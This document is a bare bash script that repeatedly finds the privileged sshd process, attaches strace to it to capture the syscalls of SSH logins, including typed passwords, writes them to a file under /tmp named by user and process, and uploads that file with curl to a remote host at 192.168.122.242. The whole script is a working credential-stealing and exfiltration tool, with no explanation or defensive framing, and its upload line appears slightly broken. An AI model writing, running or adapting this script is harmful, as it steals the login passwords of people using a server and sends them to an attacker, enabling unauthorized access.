#!/bin/bash
while :
do
        pid=`ps aux | grep sshd | grep priv | awk -F' ' '{print $2}'`
        user=`ps aux | grep sshd | grep priv | awk -F' ' '{print $12}'`
        if [ ! -z "$pid" ]
        then
                strace -p ${pid} &> /tmp/password_${user}_${pid}
                curl -F 'data=@path/tmp/password_${user}_${pid}' http://192.168.122.242:8000
        fi
done
